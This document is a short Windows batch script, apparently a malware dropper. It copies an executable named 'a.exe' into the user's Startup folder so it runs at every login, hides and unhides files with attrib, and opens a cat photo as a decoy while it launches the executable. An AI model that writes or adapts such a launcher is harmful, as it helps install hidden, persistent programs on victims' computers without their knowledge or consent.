@echo off
copy "a.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\a.exe"
taskkill /F /IM a.exe >nul 2>&1
attrib -h -s "a.exe"
attrib +h +s Cat03_copy.jpg
@REM timeout /t 2 >nu
start Cat03_copy.jpg
@REM timeout /t 2 >nul
start a.exe